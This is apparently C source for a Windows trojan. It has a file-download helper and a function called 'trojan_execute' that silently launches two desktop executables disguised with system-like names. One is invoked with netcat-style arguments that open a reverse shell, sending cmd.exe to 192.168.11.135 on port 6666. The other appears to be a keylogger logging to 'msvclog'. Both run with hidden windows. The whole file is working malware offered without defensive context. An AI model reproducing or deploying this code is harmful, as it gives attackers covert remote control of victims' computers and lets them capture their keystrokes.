#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wininet.h>
#include <Shlobj.h>

void DownloadFile(const wchar_t* url, const wchar_t* filePath)
{
    HINTERNET hInternet = InternetOpenW(L"Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hFile = InternetOpenUrlW(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);

    if (hFile)
    {
        FILE* file = _wfopen(filePath, L"wb");
        if (file)
        {
            char buffer[2048];
            DWORD bytesRead;

            do {
                InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead);
                fwrite(buffer, 1, bytesRead, file);
            } while (bytesRead > 0);

            fclose(file);
        }

        InternetCloseHandle(hFile);
    }

    InternetCloseHandle(hInternet);
}

void trojan_execute() 
{
    const wchar_t* kylgparams = L"--out-log msvclog";
    const wchar_t* ncparams   = L"-d 192.168.11.135 6666 -e C:\\Windows\\System32\\cmd.exe";

    wchar_t desktopPath[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktopPath);

    wchar_t currentPath[MAX_PATH];
    GetModuleFileNameW(NULL, currentPath, MAX_PATH);

    wchar_t ncpath[MAX_PATH];
    swprintf(ncpath, MAX_PATH, L"%s\\msvcnet.exe", desktopPath);

    wchar_t kylgpath[MAX_PATH];
    swprintf(kylgpath, MAX_PATH, L"%s\\msvcmon.exe", desktopPath);

    ShellExecuteW(NULL, L"open", ncpath, ncparams, NULL, SW_HIDE);
    ShellExecuteW(NULL, L"open", kylgpath, kylgparams, NULL, SW_HIDE);
}
